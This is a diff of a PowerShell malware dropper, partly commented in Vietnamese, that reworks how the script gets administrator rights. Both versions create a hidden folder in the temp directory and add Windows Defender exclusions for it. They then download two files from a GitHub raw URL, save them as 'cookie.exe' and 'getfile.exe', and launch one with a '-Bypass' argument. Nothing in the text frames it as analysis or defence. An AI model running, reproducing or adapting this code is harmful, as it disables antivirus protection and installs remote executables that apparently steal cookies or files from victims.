@@ -1,31 +1,46 @@
-while ($true) {
-    # Kiểm tra xem script có đang chạy với quyền admin không
-    $isAdmin = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'
+Function Check-RunAsAdministrator()
+{
+    while ($true){
+  $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
+  if($CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator))
+  {
+       Write-host "Script is running with Administrator privileges!"
+  }
+  else
+    {
+    try{
+       $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
+       $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
+       $ElevatedProcess.Verb = "runas"
+       [System.Diagnostics.Process]::Start($ElevatedProcess)
+       
+        #command here
+        
+        $systemPath = [System.IO.Path]::Combine($env:temp, "System")
+        New-Item -Path $systemPath -ItemType Directory -Force
+        try {
+        Add-MpPreference -ExclusionPath $systemPath
+        } catch {}
+        $cookieUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/cookie.txt"
+        $cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
+        Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
+        try {
+        Add-MpPreference -ExclusionProcess $cookiePath
+        } catch {}
+        $getfileUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/noname.txt"
+        $getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
+        Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
+        try {
+        Add-MpPreference -ExclusionProcess $getfilePath
+        Start-Process -FilePath $cookiePath -ArgumentList "-Bypass"
+        } catch {}
+       Exit
+    } catch {
+        Check-RunAsAdministrator
 
-    if ($isAdmin) {
-        # Nếu có quyền admin, thoát khỏi vòng lặp và chạy script
-        Write-Host "Script đang chạy với quyền admin!"
-        break
-    } else {
-        # Nếu không có quyền admin, yêu cầu chạy lại với quyền admin
-        Start-Process powershell -ArgumentList "-Command $MyInvocation.MyCommand.Path" -Verb runAs
-        Write-Host "Đang yêu cầu quyền admin..."
-        # Tiếp tục vòng lặp cho đến khi người dùng đồng ý
-        break
     }
+       }
+          }
 }
+Check-RunAsAdministrator
 
-$systemPath = [System.IO.Path]::Combine($env:temp, "System")
-New-Item -Path $systemPath -ItemType Directory -Force
-
-Add-MpPreference -ExclusionPath $systemPath
-$cookieUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/cookie.txt"
-$cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
-Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
-Add-MpPreference -ExclusionProcess $cookiePath
-
-$getfileUrl = "https://raw.githubusercontent.com/blackcodeit407/system/main/noname.txt"
-$getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
-Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
-Add-MpPreference -ExclusionProcess $getfilePath
-Start-Process -FilePath $cookiePath -ArgumentList "-Bypass"
